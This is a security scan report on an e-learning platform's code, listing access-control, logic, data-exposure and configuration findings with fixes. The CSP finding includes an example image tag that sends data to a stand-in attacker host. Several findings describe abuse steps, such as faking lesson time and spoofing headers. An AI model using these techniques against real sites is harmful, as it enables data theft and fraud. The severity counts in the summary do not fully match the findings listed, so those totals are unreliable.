# Vulnerability Scan Report — RE-learning Platform

**Target:** `/Users/nb-dk-0552/Project/relearning`
**Date:** 2026-05-21
**Scanner:** vuln-scan orchestrator (access-control, injection, data-exposure, logic, authn-session, misconfig, client-side, dependency, api, dos)
**Assessment Cycle:** Post-patch (5 remediation cycles)

---

## Summary

| Severity | Count |
|----------|-------|
| Critical | 0 |
| High | 3 |
| Medium | 10 |
| Low | 6 |
| **Total** | **19** |

---

## VULN-LOGIC-001: timeSpent Client-Side Spoofing Enables Certificate Fraud

**Severity**: High
**Confidence**: High
**Location**: `lib/actions/courses.ts:200`

**Description**: The `markSubMaterialCompleted` function accepts a `timeSpent` parameter directly from the client. The only server-side validation is `if (timeSpent < 30)` — rejecting values below 30 seconds. An attacker can send `timeSpent: 31` for every lesson immediately without actually spending time on the material. This enables automated speed-running of entire courses in seconds.

**Impact**: A malicious student can complete all lessons in a course by scripting rapid calls with `timeSpent: 31`, triggering `completeCourse()` → `generateCertificate()`. This results in fraudulent certificates, inflated leaderboard points (200-800 per course), and undermines the platform's educational credibility.

**Remediation**:
- Implement server-side session timing: record `started_at` timestamp when a lesson is opened, and validate `timeSpent` against `now() - started_at`.
- Add a maximum reasonable `timeSpent` cap (e.g., 4 hours) to prevent accumulation attacks.
- Consider per-lesson cooldown periods between completions.

---

## VULN-ACCESS-001: Material/SubMaterial CRUD Relies Solely on RLS

**Severity**: Medium
**Confidence**: High
**Location**: `lib/actions/courses.ts:862-980` (updateMaterial, deleteMaterial, createSubMaterial, updateSubMaterial, deleteSubMaterial)

**Description**: Six functions for managing course materials perform no application-level ownership verification. They rely entirely on Supabase RLS policies to enforce that only the course instructor can modify materials. If any RLS policy is misconfigured, disabled, or bypassed, any authenticated user could modify any course's content.

**Impact**: A malicious mentor could potentially modify another mentor's course content. If RLS is ever disabled for maintenance or debugging, all course content becomes writable by any authenticated user. This is a defense-in-depth failure — a single layer of protection for content integrity.

**Remediation**:
- Add explicit ownership verification: fetch the material's parent course, verify `course.instructor_id === user.id` before performing mutations.
- Return explicit authorization errors rather than relying on RLS to silently fail.

---

## VULN-ACCESS-002: Question/Option CRUD Relies Solely on RLS

**Severity**: Medium
**Confidence**: High
**Location**: `lib/actions/quests.ts:580-650` (createQuestion, updateQuestion, deleteQuestion)

**Description**: `createQuestion`, `updateQuestion`, and `deleteQuestion` perform no application-level ownership check. Any authenticated user can call these functions; only RLS prevents unauthorized modifications. The `createOption` and `updateOption` functions additionally use the admin client to write to `quest_correct_options`, bypassing RLS entirely for the `is_correct` field.

**Impact**: If RLS on `quest_questions` or `quest_options` is misconfigured, any authenticated user could inject, modify, or delete quiz questions. The admin client usage in `createOption`/`updateOption` means the `is_correct` write always bypasses RLS — the only guard is the RLS policy on the parent `quest_options` INSERT/UPDATE.

**Remediation**:
- Add ownership verification: resolve `question → quest → course → instructor_id` and verify against the caller.
- For `createOption`/`updateOption`, verify course ownership before using the admin client.

---

## VULN-LOGIC-002: Rate Limit Bypass via x-forwarded-for Spoofing

**Severity**: Medium
**Confidence**: High
**Location**: `app/api/checkout/route.ts:25`

**Description**: The checkout rate limiter keys on `req.headers.get('x-forwarded-for') || 'unknown'`. The `x-forwarded-for` header is client-controlled unless a trusted reverse proxy strips and rewrites it. An attacker can send arbitrary values to get a fresh rate limit bucket per request, completely bypassing the 5-requests-per-minute limit.

**Impact**: Unlimited checkout session creation, enabling payment fraud attempts, resource exhaustion on Stripe API, and potential financial abuse.

**Remediation**:
- Use a trusted proxy header (e.g., Netlify's `x-nf-client-connection-ip` or Cloudflare's `cf-connecting-ip`).
- If behind a known proxy, configure the app to only trust the last hop in `x-forwarded-for`.
- Add a fallback to session-based rate limiting (keyed on `user.id`) as a secondary control.

---

## VULN-DATA-001: Leaderboard Exposes User Emails

**Severity**: Medium
**Confidence**: High
**Location**: `lib/actions/gamification.ts:262-270`

**Description**: The `getLeaderboard` function joins `leaderboard_stats` with `profiles` and selects `full_name, email`. This email data is returned to the client and displayed on the public leaderboard page, exposing all ranked users' email addresses to any authenticated user.

**Impact**: User email enumeration for all active students. Enables targeted phishing, spam, and social engineering attacks against platform users.

**Remediation**:
- Remove `email` from the leaderboard query's select clause. Only return `full_name` and `avatar_url`.
- If email is needed for admin views, create a separate admin-only leaderboard endpoint.

---

## VULN-DATA-002: Profiles SELECT Policy Exposes All User Data

**Severity**: Medium
**Confidence**: High
**Location**: `database/supabase-schema.sql:354-356`

**Description**: The RLS policy `"Public profiles are viewable by everyone"` uses `USING (true)`, making all profile columns (email, full_name, role, avatar_url, bio, is_approved, is_active) readable by any authenticated user via direct Supabase client queries.

**Impact**: Complete user enumeration — any authenticated user can query all profiles to extract emails, names, roles, and account statuses. This facilitates targeted attacks against admin/mentor accounts and violates data minimization principles.

**Remediation**:
- Restrict the SELECT policy to expose only non-sensitive columns (full_name, avatar_url) to other users.
- Allow full profile access only to the profile owner and admins.
- Alternatively, create a `public_profiles` view with limited columns.

---

## VULN-DATA-003: Raw Error Objects Returned to Client (118 Locations)

**Severity**: Medium
**Confidence**: High
**Location**: `lib/actions/courses.ts` (42), `lib/actions/enrollment-requests.ts` (29), `lib/actions/quests.ts` (29), `lib/actions/gamification.ts` (9), `lib/actions/skills.ts` (6), `lib/actions/tools.ts` (3)

**Description**: 118 instances of `return { success: false, error }` pass raw caught error objects to the client. These may contain stack traces, database error messages, internal table/column names, constraint names, and Supabase internal details.

**Impact**: Information disclosure that aids attackers in understanding the database schema, identifying constraint names for bypass attempts, and mapping internal architecture. Specific Supabase/PostgreSQL error codes can reveal table structures.

**Remediation**:
- Replace raw error returns with generic user-facing messages: `return { success: false, error: 'Operation failed' }`.
- Log the full error server-side for debugging.
- Create a utility function: `sanitizeError(error)` that maps known error codes to safe messages.

---

## VULN-LOGIC-003: Certificates Persist After Refund

**Severity**: High
**Confidence**: High
**Location**: `app/api/webhooks/stripe/route.ts:140-165`

**Description**: The `handleChargeRefunded` webhook handler deletes the enrollment but does not delete or revoke the associated certificate. After a refund, the student loses course access but retains a valid, publicly-verifiable certificate.

**Impact**: A student can complete a course, obtain a certificate, then request a Stripe refund — keeping the certificate while getting their money back. The certificate remains publicly verifiable at its verification URL, constituting credential fraud.

**Remediation**:
- In `handleChargeRefunded`, after deleting the enrollment, also delete certificates for the same `student_id` + `course_id` combination.
- Consider adding a `revoked` status to certificates instead of hard deletion, to maintain audit trail.

---

## VULN-LOGIC-004: No Webhook Event Deduplication

**Severity**: Medium
**Confidence**: Medium
**Location**: `app/api/webhooks/stripe/route.ts:18-70`

**Description**: The webhook handler processes events without checking if they've been previously handled. Stripe may retry webhook deliveries on timeout or 5xx responses. While `enrollInCourseInternal` checks for existing enrollment (preventing duplicate enrollments), other side effects like `updateStreak()` and point awards in the completion flow could be triggered multiple times.

**Impact**: Potential duplicate point awards and streak updates if webhook events are replayed. While enrollment duplication is prevented, gamification side effects are not idempotent.

**Remediation**:
- Store processed `event.id` values in a database table with a TTL (e.g., 72 hours).
- Check for existing `event.id` before processing and return 200 immediately for duplicates.

---

## VULN-AUTHN-001: No Multi-Factor Authentication for Admin Accounts

**Severity**: High
**Confidence**: High
**Location**: `lib/actions/auth.ts` (entire auth flow)

**Description**: Admin accounts have no MFA requirement. Authentication relies solely on email/password. Admin accounts have access to the service role key operations (user management, enrollment approval, payment status changes) and can bypass all RLS via admin client.

**Impact**: A compromised admin password (via phishing, credential stuffing, or reuse) grants full platform control with no second factor. The attacker could modify all user roles, approve fraudulent enrollments, access all payment data, and manipulate course content.

**Remediation**:
- Enable Supabase Auth MFA (TOTP) and require it for admin role accounts.
- Add MFA verification check in middleware for `/admin/*` routes.
- Consider requiring MFA re-verification for sensitive admin operations.

---

## VULN-AUTHN-002: Weak Password Policy (Length Only)

**Severity**: Low
**Confidence**: High
**Location**: `lib/actions/auth.ts:210`

**Description**: Password validation only enforces minimum 8 characters (`password.length < 8`). No complexity requirements (uppercase, lowercase, digits, special characters) and no check against common/breached passwords.

**Impact**: Users can set weak passwords like "password" or "12345678", making accounts vulnerable to dictionary attacks and credential stuffing. The 5/min rate limit on login provides some protection but doesn't prevent offline attacks if the database is compromised.

**Remediation**:
- Add complexity requirements: at least one uppercase, one lowercase, one digit, one special character.
- Integrate a breached password check (e.g., HaveIBeenPwned k-anonymity API).
- Consider minimum 12 characters for admin accounts.

---

## VULN-MISCONFIG-001: CSP Allows unsafe-inline for Scripts and Styles

**Severity**: Medium
**Confidence**: High
**Location**: `next.config.js:67`

**Description**: The Content-Security-Policy header includes `script-src 'self' 'unsafe-inline'` and `style-src 'self' 'unsafe-inline'`. This effectively negates CSP's XSS protection since any injected inline script will execute.

**Impact**: If an XSS vector exists (e.g., stored XSS in course content, quiz questions, or user bios), the `unsafe-inline` directive allows the injected script to execute without CSP blocking it.

**Remediation**:
- Replace `'unsafe-inline'` with nonce-based CSP: generate a per-request nonce and apply it to legitimate inline scripts.
- For styles, use `'unsafe-hashes'` with specific hash values for known inline styles, or move all styles to external files.
- Next.js 15 supports `nonce` configuration via `experimental.sri`.

---

## VULN-MISCONFIG-002: TypeScript ignoreBuildErrors Enabled

**Severity**: Low
**Confidence**: High
**Location**: `next.config.js:5-8`

**Description**: `typescript.ignoreBuildErrors: true` suppresses all TypeScript errors during production builds. Type errors that could indicate security-relevant issues (wrong parameter types, missing null checks, incorrect return types) are silently ignored.

**Impact**: Type confusion bugs may reach production undetected. For example, a function expecting a validated UUID could receive an unsanitized string, or a null check could be missing on a security-critical path. The TODO comment indicates this is a known technical debt item.

**Remediation**:
- Fix the underlying type issues (Supabase type narrowing, Next.js 15 async params).
- Remove `ignoreBuildErrors: true` to catch type errors at build time.
- As an interim measure, run `tsc --noEmit` in CI to surface type errors without blocking builds.

---

## VULN-MISCONFIG-003: Overly Broad img-src CSP Directive

**Severity**: Low
**Confidence**: Medium
**Location**: `next.config.js:67`

**Description**: The CSP `img-src` directive is set to `'self' data: https: blob:` — allowing images from any HTTPS source. This is overly permissive and could be used for data exfiltration via image requests or tracking pixels.

**Impact**: An attacker who achieves stored XSS or content injection could load images from attacker-controlled servers, exfiltrating data via URL parameters (e.g., `<img src="https://evil.com/collect?data=...">`). Also enables CSRF token exfiltration via image-based side channels.

**Remediation**:
- Restrict `img-src` to known domains: `'self' data: blob: https://res.cloudinary.com https://lh3.googleusercontent.com https://ui-avatars.com https://placehold.co`.

---

## VULN-API-001: No Ownership Check on createOption/updateOption (Admin Client Bypass)

**Severity**: Medium
**Confidence**: High
**Location**: `lib/actions/quests.ts:660-720`

**Description**: `createOption` and `updateOption` use the admin client (service role) to write `is_correct` values to `quest_correct_options`. The only access control is the RLS policy on the `quest_options` table for the initial insert/update. There is no application-level verification that the caller owns the course containing the question.

**Impact**: If the RLS policy on `quest_options` has any gap, an attacker could create options with `is_correct: true` on any question, or modify existing correct answers. The admin client write to `quest_correct_options` bypasses all RLS.

**Remediation**:
- Before using the admin client, verify the caller owns the course: resolve `option → question → quest → course → instructor_id`.
- Add this ownership check as a prerequisite before any admin client operation.

---

## VULN-DOS-001: getStudentRank Loads All Leaderboard Stats

**Severity**: Low
**Confidence**: High
**Location**: `lib/actions/gamification.ts:305-315`

**Description**: `getStudentRank` fetches ALL rows from `leaderboard_stats` ordered by `total_points`, then uses `Array.findIndex()` to locate the student's position. No `.limit()` is applied to the query.

**Impact**: As the platform grows, this query loads the entire leaderboard into memory for every rank lookup. With thousands of students, this causes increasing memory pressure and response latency. Could be exploited by repeatedly calling the function to cause memory exhaustion.

**Remediation**:
- Use a SQL window function or subquery to compute rank server-side: `SELECT COUNT(*) + 1 FROM leaderboard_stats WHERE total_points > (SELECT total_points FROM leaderboard_stats WHERE student_id = $1)`.
- Alternatively, use Supabase's `.rpc()` with a stored function for efficient rank calculation.

---

## VULN-DOS-002: getPublishedCourses Has No Pagination

**Severity**: Low
**Confidence**: Medium
**Location**: `lib/actions/courses.ts:545-565`

**Description**: `getPublishedCourses` fetches all published and approved courses with no `.limit()` or pagination. As the course catalog grows, this returns an unbounded result set.

**Impact**: With hundreds or thousands of courses, the response payload grows linearly, causing increased memory usage, slower response times, and potential timeout issues. Not immediately exploitable but degrades over time.

**Remediation**:
- Add pagination parameters: `getPublishedCourses(page: number = 1, pageSize: number = 20)`.
- Apply `.range((page-1)*pageSize, page*pageSize - 1)` to the query.

---

## VULN-DEPENDENCY-001: 12 Known Vulnerabilities in Dependencies

**Severity**: Medium
**Confidence**: High
**Location**: `package.json` (transitive dependencies)

**Description**: `npm audit` reports 12 vulnerabilities (6 moderate, 6 high):
- **High**: flatted (DoS via recursion), lodash (prototype pollution), minimatch (ReDoS), picomatch (ReDoS + method injection), rollup (arbitrary file write), vite (path traversal + file read)
- **Moderate**: ajv (ReDoS), brace-expansion (DoS), postcss (XSS), qs (DoS), ws (memory disclosure)

**Impact**: 
- **vite/rollup** (dev-only): Path traversal and file read in dev server — exploitable if dev server is exposed to untrusted networks.
- **lodash** (prototype pollution): Could enable property injection if user input reaches lodash functions.
- **flatted** (DoS): Unbounded recursion in parse — exploitable if parsing untrusted JSON.
- Most are in dev/build dependencies and don't affect production runtime directly.

**Remediation**:
- Run `npm audit fix` to resolve automatically fixable issues.
- For breaking changes (postcss/next), evaluate upgrade path.
- Prioritize lodash and flatted fixes as they may affect runtime.
- Ensure dev servers (vite) are never exposed to untrusted networks.

---

## VULN-CLIENT-001: Open Redirect Mitigated (Confirmed)

**Severity**: Info (No Finding)
**Confidence**: High
**Location**: `app/auth/callback/route.ts:130`

**Description**: The `next` parameter in the auth callback is validated with `next.startsWith('/')`, preventing absolute URL redirects to external domains. This is correctly implemented.

**Impact**: N/A — mitigated.

**Remediation**: None required.

---

## VULN-INJECTION-001: No Injection Vectors Found (Confirmed Clean)

**Severity**: Info (No Finding)
**Confidence**: High
**Location**: Entire codebase

**Description**: No instances of `dangerouslySetInnerHTML`, `eval()`, `.raw()`, or `.query()` found. All database interactions use the Supabase query builder (parameterized). LIKE wildcards are escaped in `getAllTools`. Input validation via Zod is applied on critical paths.

**Impact**: N/A — no injection vectors identified.

**Remediation**: None required. Maintain current practices.

---

## VULN-AUTHN-003: Password Reset Token Handled by Supabase (No App-Level Reuse Risk)

**Severity**: Info (No Finding)
**Confidence**: Medium
**Location**: `lib/actions/auth.ts:173-195`

**Description**: Password reset uses `supabase.auth.resetPasswordForEmail()` which delegates token generation, delivery, and validation entirely to Supabase Auth. The application does not handle tokens directly. Supabase Auth tokens are single-use by default.

**Impact**: N/A — token lifecycle managed by Supabase Auth infrastructure.

**Remediation**: None required at application level. Verify Supabase project settings enforce single-use tokens.

---

## Findings by Scanner

| Scanner | Findings | Severities |
|---------|----------|------------|
| vuln-access-control (3b) | 3 | Medium ×3 |
| vuln-injection (3a) | 0 | Clean |
| vuln-data-exposure (3c) | 3 | Medium ×3 |
| vuln-logic (3g) | 4 | High ×2, Medium ×2 |
| vuln-authn-session (3h) | 2 | High ×1, Low ×1 |
| vuln-misconfig (3f) | 3 | Medium ×1, Low ×2 |
| vuln-client-side (3k) | 0 | Clean |
| vuln-dependency (3l) | 1 | Medium ×1 |
| vuln-api (3m) | 1 | Medium ×1 |
| vuln-dos (3o) | 2 | Low ×2 |
